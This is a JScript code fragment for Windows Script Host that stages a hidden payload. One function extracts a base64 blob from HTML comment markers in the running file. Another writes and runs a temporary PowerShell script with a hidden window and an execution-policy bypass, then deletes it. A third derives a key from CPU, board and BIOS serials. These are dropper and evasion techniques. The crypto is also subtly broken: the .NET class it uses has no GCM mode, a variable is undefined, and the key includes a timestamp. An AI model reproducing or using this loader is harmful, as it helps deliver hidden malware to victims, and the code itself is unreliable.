// AES-256-GCM implementation using Windows CryptoAPI
function _aesDecrypt(key, iv, authTag, ciphertext) {
    try {
        var crypto = new ActiveXObject("CAPICOM.Utilities");
        var keyHex = bytesToHex(key);
        var ivHex = bytesToHex(iv);
        var tagHex = bytesToHex(authTag);
        var cipherHex = bytesToHex(ciphertext);
        
        // Construct a temporary PowerShell command for AES decryption
        var psCmd = "powershell -WindowStyle Hidden -Command \"$key=[Convert]::FromBase64String('" + 
                   btoa(String.fromCharCode.apply(null, key)) + 
                   "');$iv=[Convert]::FromBase64String('" + 
                   btoa(String.fromCharCode.apply(null, iv)) + 
                   "');$cipher=[Convert]::FromBase64String('" + 
                   btoa(String.fromCharCode.apply(null, ciphertext)) + 
                   "');$aes=new-object System.Security.Cryptography.AesCryptoServiceProvider;" +
                   "$aes.Mode='GCM';$aes.Key=$key;$aes.IV=$iv;$aes.AuthenticatedTag=$authTag;" +
                   "$decryptor=$aes.CreateDecryptor();$result=$decryptor.TransformFinalBlock($cipher,0,$cipher.Length);" +
                   "[System.Text.Encoding]::UTF8.GetString($result)\"";
        
        var shell = new ActiveXObject("WScript.Shell");
        var fso = new ActiveXObject("Scripting.FileSystemObject");
        var tempPath = shell.ExpandEnvironmentStrings("%TEMP%");
        var tempFile = tempPath + "\\temp_" + Math.random().toString(36).substring(2, 10) + ".ps1";
        
        var file = fso.CreateTextFile(tempFile, true);
        file.Write(psCmd.replace("powershell -WindowStyle Hidden -Command", ""));
        file.Close();
        
        var exec = shell.Exec("powershell -ExecutionPolicy Bypass -File \"" + tempFile + "\"");
        var output = exec.StdOut.ReadAll();
        
        fso.DeleteFile(tempFile);
        return output;
    } catch(e) {
        return null;
    }
}

// Enhanced RC4 with dynamic key derivation
function _rc4(key, data) {
    var s = [], j = 0, x, out = '';
    for (var i = 0; i < 256; i++) s[i] = i;
    for (i = 0; i < 256; i++) {
        j = (j + s[i] + key.charCodeAt(i % key.length)) % 256;
        x = s[i]; s[i] = s[j]; s[j] = x;
    }
    i = j = 0;
    for (var y = 0; y < data.length; y++) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        x = s[i]; s[i] = s[j]; s[j] = x;
        out += String.fromCharCode(data.charCodeAt(y) ^ s[(s[i] + s[j]) % 256]);
    }
    return out;
}

// Dynamic key derivation based on system fingerprint
function _deriveKey() {
    var wmi = new ActiveXObject("WbemScripting.SWbemLocator").ConnectServer(".", "root\\cimv2");
    var hwid = "";
    
    // CPU ID
    var cpuCol = wmi.ExecQuery("SELECT ProcessorId FROM Win32_Processor");
    var cpuEnum = new Enumerator(cpuCol);
    for (; !cpuEnum.atEnd(); cpuEnum.moveNext()) {
        hwid += cpuEnum.item().ProcessorId;
        break;
    }
    
    // Motherboard Serial
    var boardCol = wmi.ExecQuery("SELECT SerialNumber FROM Win32_BaseBoard");
    var boardEnum = new Enumerator(boardCol);
    for (; !boardEnum.atEnd(); boardEnum.moveNext()) {
        hwid += boardEnum.item().SerialNumber;
        break;
    }
    
    // BIOS Serial
    var biosCol = wmi.ExecQuery("SELECT SerialNumber FROM Win32_BIOS");
    var biosEnum = new Enumerator(biosCol);
    for (; !biosEnum.atEnd(); biosEnum.moveNext()) {
        hwid += biosEnum.item().SerialNumber;
        break;
    }
    
    // Combine with timestamp and create hash
    var baseKey = "AdvSecKey2026_" + hwid + "_" + Date.now();
    return CryptoJS.MD5(baseKey).toString().substring(0, 32);
}

// Extract embedded payload from HTML comment markers
function _extractPayload() {
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var thisPath = location.pathname.replace(/^file:\/\//i, '').replace(/\//g, '\\');
    var file = fso.OpenTextFile(thisPath, 1, false);
    var raw = file.ReadAll();
    file.Close();
    
    var startMarker = '<!--[PAYLOAD]';
    var endMarker = '[/PAYLOAD]-->';
    var s = raw.indexOf(startMarker);
    var e = raw.indexOf(endMarker);
    if (s === -1 || e === -1 || e <= s) return null;
    
    var b64 = raw.substring(s + startMarker.length, e);
    // Decode Base64 using MSXML2.DOMDocument
    var xml = new ActiveXObject("MSXML2.DOMDocument");
    var node = xml.createElement("B64");
    node.dataType = "bin.base64";
    node.text = b64;
    return node.nodeTypedValue; // byte array (VT_ARRAY|VT_UI1)
}

// Helper function to convert byte array to hex string
function bytesToHex(bytes) {
    var hex = [];
    for(var i = 0; i < bytes.length; i++) {
        var current = bytes[i] < 0 ? bytes[i] + 256 : bytes[i];
        hex.push((current >>> 4).toString(16));
        hex.push((current & 0xF).toString(16));
    }
    return hex.join("");
}

